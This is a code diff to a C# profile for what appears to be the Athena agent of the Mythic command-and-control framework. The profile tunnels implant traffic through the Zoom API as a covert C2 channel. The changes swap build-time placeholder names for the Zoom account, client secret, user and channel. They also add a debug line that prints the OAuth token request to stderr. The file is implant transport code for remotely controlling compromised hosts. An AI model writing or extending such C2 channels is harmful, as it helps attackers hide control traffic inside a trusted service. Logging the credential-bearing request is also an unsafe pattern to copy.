@@ -28,13 +28,16 @@ namespace Agent.Profiles
         private ILogger logger { get; set; }
 
         // ---- C2 parameters (substituted at build time by builder.buildZoom) ----
-        private string accountId = "zoom_account_id";
-        private string clientId = "client_id";
-        private string clientSecret = "client_secret";
-        private string userId = "user_id";
-        private string channelId = "channel_id";
-        private string apiBase = "api_base";
-        private string oauthBase = "oauth_base";
+        // Fixed %ZOOM_*% placeholders are used (not the bare C2 param names) so
+        // Athena's global text-replace can never collide with literal API field
+        // names such as the OAuth "account_id" form key.
+        private string accountId = "%ZOOM_ACCOUNT_ID%";
+        private string clientId = "%ZOOM_CLIENT_ID%";
+        private string clientSecret = "%ZOOM_CLIENT_SECRET%";
+        private string userId = "%ZOOM_USER_ID%";
+        private string channelId = "%ZOOM_CHANNEL_ID%";
+        private string apiBase = "%ZOOM_API_BASE%";
+        private string oauthBase = "%ZOOM_OAUTH_BASE%";
 
         // ---- wire protocol constants ----
         private const string DIR_AGENT_TO_SERVER = "O";   // consumed by the Mythic bridge
@@ -77,12 +80,6 @@ namespace Agent.Profiles
             this._client = new HttpClient(handler);
             this._client.Timeout = TimeSpan.FromSeconds(30);
 
-            // NOTE: do NOT use the bare token names (zoom_account_id, client_id, ...)
-            // as string literals anywhere in this file — Athena's builder does a
-            // global text replace of each C2 parameter name, which would corrupt
-            // any literal that happens to match (e.g. the OAuth "account_id" form
-            // field key). The OAuth key below is intentionally a different string
-            // from the substitution token (zoom_account_id).
             Console.Error.WriteLine("[zoom] profile loaded");
         }
 
@@ -99,11 +96,13 @@ namespace Agent.Profiles
             string url = $"{oauthBase.TrimEnd('/')}/token";
             using HttpRequestMessage req = new HttpRequestMessage(HttpMethod.Post, url);
             req.Headers.Authorization = new AuthenticationHeaderValue("Basic", basic);
-            req.Content = new FormUrlEncodedContent(new Dictionary<string, string>
+            var formContent = new FormUrlEncodedContent(new Dictionary<string, string>
             {
                 { "grant_type", "account_credentials" },
                 { "account_id", accountId },
             });
+            Console.Error.WriteLine($"[zoom] OAuth POST {url} body={await formContent.ReadAsStringAsync()}");
+            req.Content = formContent;
             using HttpResponseMessage resp = await _client.SendAsync(req);
             string body = await resp.Content.ReadAsStringAsync();
             if (!resp.IsSuccessStatusCode)
